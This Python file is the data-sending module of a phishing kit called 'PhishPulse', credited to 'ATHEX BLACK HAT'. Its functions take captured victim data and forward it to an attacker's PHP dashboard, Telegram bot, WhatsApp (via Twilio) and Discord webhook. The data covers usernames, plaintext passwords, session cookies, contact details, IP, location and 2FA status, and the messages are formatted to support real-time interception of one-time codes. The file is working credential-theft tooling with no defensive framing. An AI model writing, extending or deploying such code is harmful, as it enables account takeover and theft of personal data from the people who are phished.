#!/usr/bin/env python3
"""
PhishPulse - Multi-Channel Data Sender
Version: 2.0
Author: ATHEX BLACK HAT

Supports: Dashboard (PHP), Telegram Bot, WhatsApp (Twilio), Discord
"""

import os
import json
import requests
from datetime import datetime
from colorama import Fore, Style

# Load environment variables
try:
    from dotenv import load_dotenv
    load_dotenv()
except:
    pass

DASHBOARD_URL = os.getenv('DASHBOARD_URL', 'http://localhost:8888')
NOTIFICATION_METHOD = os.getenv('NOTIFICATION_METHOD', 'dashboard')  # dashboard, telegram, whatsapp, all

TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')

TWILIO_ACCOUNT_SID = os.getenv('TWILIO_ACCOUNT_SID', '')
TWILIO_AUTH_TOKEN = os.getenv('TWILIO_AUTH_TOKEN', '')
TWILIO_WHATSAPP_FROM = os.getenv('TWILIO_WHATSAPP_FROM', '')
WHATSAPP_TO = os.getenv('WHATSAPP_TO', '')

DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', '')

def send_notification(data):
    """
    Send notification based on configured method
    
    Args:
        data: Victim/visitor data dict
        
    Returns:
        dict: Results from each channel
    """
    results = {
        'dashboard': False,
        'telegram': False,
        'whatsapp': False,
        'discord': False
    }
    
    method = NOTIFICATION_METHOD.lower()
    
    if method in ['dashboard', 'all']:
        results['dashboard'] = send_to_dashboard(data)
    
    if method in ['telegram', 'all']:
        results['telegram'] = send_telegram_message(data)
    
    if method in ['whatsapp', 'all']:
        results['whatsapp'] = send_whatsapp_message(data)
    
    # Discord as fallback if configured
    if DISCORD_WEBHOOK_URL:
        results['discord'] = send_discord_message(data)
    
    return results


def send_to_dashboard(data):
    """Send data to PHP dashboard"""
    if not DASHBOARD_URL:
        return False
    
    api_url = f"{DASHBOARD_URL}/api.php"
    
    data_type = data.get('type', '')
    
    action_map = {
        'visitor': 'add_visitor',
        'login_success': 'add_victim',
        'login_failed': 'add_victim',
        'login_2fa': 'add_victim',
    }
    
    action = action_map.get(data_type, 'add_victim')
    url = f"{api_url}?action={action}"
    
    try:
        response = requests.post(
            url,
            json=data,
            timeout=5,
            headers={'Content-Type': 'application/json', 'User-Agent': 'PhishPulse/2.0'}
        )
        return response.status_code == 200
    except:
        return False


def send_telegram_message(data):
    """
    Send formatted message to Telegram
    
    Args:
        data: Victim/visitor data dict
        
    Returns:
        bool: Success or failure
    """
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    
    message = format_telegram_message(data)
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML',
        'disable_web_page_preview': True
    }
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        result = response.json()
        
        if result.get('ok'):
            print(f"{Fore.GREEN}[✓] Telegram notification sent{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.YELLOW}[!] Telegram error: {result.get('description', 'Unknown')}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[✗] Telegram failed: {str(e)[:50]}{Style.RESET_ALL}")
        return False

def format_telegram_message(data):
    """Format data for Telegram HTML message"""
    data_type = data.get('type', '')
    platform = data.get('platform', 'unknown').upper()
    
    if data_type == 'visitor':
        return f"""
 <b>NEW VISITOR</b>
━━━━━━━━━━━━━━━━━
 <b>Platform:</b> {platform}
 <b>IP:</b> <code>{data.get('ip_address', 'N/A')}</code>
 <b>Country:</b> {data.get('country', 'Unknown')}
 <b>City:</b> {data.get('city', 'Unknown')}
 <b>Time:</b> {data.get('timestamp', 'N/A')}
━━━━━━━━━━━━━━━━━
🛡️ <i>PhishPulse v1.0</i>
"""
    
    elif data_type == 'login_success':
        profile = data.get('profile', {})
        device = data.get('device', {})
        cookies = data.get('cookies', {})
        
        # Format cookies
        cookies_str = ''
        if cookies and isinstance(cookies, dict):
            for key, value in list(cookies.items())[:3]:  # Show first 3
                if isinstance(value, str):
                    cookies_str += f" <b>{key}:</b> <code>{value[:30]}...</code>\n"
        
        return f"""
 <b>SUCCESSFUL LOGIN!</b>
━━━━━━━━━━━━━━━━━
 <b>Platform:</b> {platform}
 <b>Username:</b> {data.get('username', 'N/A')}
 <b>Password:</b> <code>{data.get('password', 'N/A')}</code>
 <b>Email:</b> {profile.get('email', 'N/A')}
 <b>Phone:</b> {profile.get('phone', 'N/A')}
 <b>Followers:</b> {profile.get('followers', 0):,}
 <b>Verified:</b> {'Yes' if profile.get('is_verified') else 'No'}
{cookies_str}
━━━━━━━━━━━━━━━━━
 <b>Country:</b> {device.get('country', 'Unknown')}
 <b>City:</b> {device.get('city', 'Unknown')}
 <b>ISP:</b> {device.get('isp', 'Unknown')}
 <b>VPN:</b> {'⚠️ YES' if device.get('is_vpn') else '✅ NO'}
 <b>IP:</b> <code>{device.get('ip_address', 'N/A')}</code>
 <b>Time:</b> {data.get('timestamp', 'N/A')}
━━━━━━━━━━━━━━━━━
🛡️ <i>PhishPulse v1.0</i>
"""
    
    elif data_type == 'login_failed':
        device = data.get('device', {})
        return f"""
 <b>FAILED LOGIN</b>
━━━━━━━━━━━━━━━━━
 <b>Platform:</b> {platform}
 <b>Username:</b> {data.get('username', 'N/A')}
 <b>Password:</b> <code>{data.get('password', 'N/A')}</code>
 <b>Error:</b> {data.get('error', 'Invalid credentials')}
━━━━━━━━━━━━━━━━━
 <b>Country:</b> {device.get('country', 'Unknown')}
 <b>Time:</b> {data.get('timestamp', 'N/A')}
━━━━━━━━━━━━━━━━━
🛡️ <i>PhishPulse v1.0</i>
"""
    
    elif data_type == 'login_2fa':
        return f"""
 <b>2FA REQUIRED!</b>
━━━━━━━━━━━━━━━━━
 <b>Platform:</b> {platform}
 <b>Username:</b> {data.get('username', 'N/A')}
 <b>Password:</b> <code>{data.get('password', 'N/A')}</code>
 <b>2FA Method:</b> {data.get('twofa_method', 'unknown').upper()}
 <b>Phone:</b> {data.get('phone', 'N/A')}
 <b>Status:</b> Waiting for code...
━━━━━━━━━━━━━━━━━
 <b>Time:</b> {data.get('timestamp', 'N/A')}
━━━━━━━━━━━━━━━━━
🛡️ <i>PhishPulse v1.0</i>
"""
    
    return f" <b>PhishPulse Data</b>\n<pre>{json.dumps(data, indent=2)}</pre>"


def send_whatsapp_message(data):
    """
    Send formatted message to WhatsApp via Twilio
    
    Args:
        data: Victim/visitor data dict
        
    Returns:
        bool: Success or failure
    """
    if not TWILIO_ACCOUNT_SID or not TWILIO_AUTH_TOKEN:
        return False
    
    if not TWILIO_WHATSAPP_FROM or not WHATSAPP_TO:
        return False
    
    message = format_whatsapp_message(data)
    
    url = f"https://api.twilio.com/2010-04-01/Accounts/{TWILIO_ACCOUNT_SID}/Messages.json"
    
    payload = {
        'From': TWILIO_WHATSAPP_FROM,
        'To': WHATSAPP_TO,
        'Body': message
    }
    
    try:
        response = requests.post(
            url,
            data=payload,
            auth=(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN),
            timeout=10
        )
        
        if response.status_code in [200, 201]:
            print(f"{Fore.GREEN}[✓] WhatsApp notification sent{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.YELLOW}[!] WhatsApp error: {response.status_code}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[✗] WhatsApp failed: {str(e)[:50]}{Style.RESET_ALL}")
        return False

def format_whatsapp_message(data):
    """Format data for WhatsApp message (plain text, no HTML)"""
    data_type = data.get('type', '')
    platform = data.get('platform', 'unknown').upper()
    
    if data_type == 'visitor':
        return f""" *NEW VISITOR*
━━━━━━━━━━━━━━━
 Platform: {platform}
 IP: {data.get('ip_address', 'N/A')}
 Country: {data.get('country', 'Unknown')}
 City: {data.get('city', 'Unknown')}
 Time: {data.get('timestamp', 'N/A')}
━━━━━━━━━━━━━━━
🛡️ PhishPulse v1.0"""
    
    elif data_type == 'login_success':
        profile = data.get('profile', {})
        device = data.get('device', {})
        
        return f""" *SUCCESSFUL LOGIN!*
━━━━━━━━━━━━━━━
 Platform: {platform}
 Username: {data.get('username', 'N/A')}
 Password: {data.get('password', 'N/A')}
 Email: {profile.get('email', 'N/A')}
 Phone: {profile.get('phone', 'N/A')}
 Followers: {profile.get('followers', 0):,}
 Verified: {'Yes' if profile.get('is_verified') else 'No'}
━━━━━━━━━━━━━━━
 Country: {device.get('country', 'Unknown')}
 City: {device.get('city', 'Unknown')}
 ISP: {device.get('isp', 'Unknown')}
 VPN: {'⚠️ YES' if device.get('is_vpn') else '✅ NO'}
 Time: {data.get('timestamp', 'N/A')}
━━━━━━━━━━━━━━━
🛡️ PhishPulse v1.0"""
    
    elif data_type == 'login_failed':
        return f""" *FAILED LOGIN*
━━━━━━━━━━━━━━━
 Platform: {platform}
 Username: {data.get('username', 'N/A')}
 Password: {data.get('password', 'N/A')}
 Error: {data.get('error', 'Invalid')}
 Time: {data.get('timestamp', 'N/A')}
━━━━━━━━━━━━━━━
🛡️ PhishPulse v1.0"""
    
    elif data_type == 'login_2fa':
        return f""" *2FA REQUIRED!*
━━━━━━━━━━━━━━━
 Platform: {platform}
 Username: {data.get('username', 'N/A')}
 Password: {data.get('password', 'N/A')}
 2FA: {data.get('twofa_method', 'unknown').upper()}
 Waiting for code...
 Time: {data.get('timestamp', 'N/A')}
━━━━━━━━━━━━━━━
🛡️ PhishPulse v1.0"""
    
    return f" PhishPulse Data\n{json.dumps(data, indent=2)}"


def send_discord_message(data):
    """Send message to Discord webhook"""
    if not DISCORD_WEBHOOK_URL:
        return False
    
    data_type = data.get('type', '')
    platform = data.get('platform', 'unknown').upper()
    
    if data_type == 'visitor':
        title = " New Visitor"
        color = 0x00ff88
    elif data_type == 'login_success':
        title = " Successful Login!"
        color = 0x00ff00
    elif data_type == 'login_failed':
        title = " Failed Login"
        color = 0xff0000
    elif data_type == 'login_2fa':
        title = " 2FA Required"
        color = 0xffaa00
    else:
        title = " Data"
        color = 0x888888
    
    embed = {
        'title': title,
        'color': color,
        'fields': [
            {'name': 'Platform', 'value': platform, 'inline': True},
            {'name': 'Username', 'value': data.get('username', 'N/A'), 'inline': True},
        ],
        'footer': {'text': 'PhishPulse v2.0'},
        'timestamp': data.get('timestamp', datetime.now().isoformat())
    }
    
    if data.get('password'):
        embed['fields'].append({'name': 'Password', 'value': f"||{data['password']}||", 'inline': False})
    
    if data.get('device', {}).get('country'):
        embed['fields'].append({'name': 'Country', 'value': data['device']['country'], 'inline': True})
    
    payload = {
        'embeds': [embed]
    }
    
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
        return response.status_code == 204
    except:
        return False


def test_telegram():
    """Test Telegram connection"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False, "Telegram not configured"
    
    test_data = {
        'type': 'visitor',
        'platform': 'test',
        'ip_address': '127.0.0.1',
        'country': 'Test',
        'city': 'Test',
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    result = send_telegram_message(test_data)
    return result, "Sent" if result else "Failed"

def test_whatsapp():
    """Test WhatsApp connection"""
    if not TWILIO_ACCOUNT_SID or not TWILIO_AUTH_TOKEN:
        return False, "WhatsApp not configured"
    
    test_data = {
        'type': 'visitor',
        'platform': 'test',
        'ip_address': '127.0.0.1',
        'country': 'Test',
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    result = send_whatsapp_message(test_data)
    return result, "Sent" if result else "Failed"

def get_notification_status():
    """Get current notification configuration status"""
    return {
        'method': NOTIFICATION_METHOD,
        'dashboard': bool(DASHBOARD_URL),
        'telegram': bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID),
        'whatsapp': bool(TWILIO_ACCOUNT_SID and TWILIO_AUTH_TOKEN and TWILIO_WHATSAPP_FROM and WHATSAPP_TO),
        'discord': bool(DISCORD_WEBHOOK_URL),
    }